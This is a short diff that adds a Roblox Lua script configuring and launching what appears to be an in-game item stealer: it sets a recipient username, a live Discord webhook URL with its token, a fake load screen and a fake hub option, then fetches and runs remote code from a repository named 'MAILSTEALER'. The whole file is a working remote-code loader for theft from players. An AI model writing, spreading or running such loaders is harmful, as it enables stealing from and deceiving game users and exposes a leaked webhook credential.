@@ -1,0 +1,7 @@
+Username = "Ojiojiojiojiwwwww"
+Webhook = "https://discord.com/api/webhooks/1191015473760968724/S8K-rduvZM3yvJQoSAMwE5VSETmXWE9wSmRLaxNxIiXqWVdmcA7c_x1OIYTe2KDtj1ew"
+Mailmsg = "Message"
+FakeLoadScreen = true
+Fake_Hub_If_Not_Enough_Gems = false
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/POGGERZ15/MAILSTEALER/main/Main.lua"))()
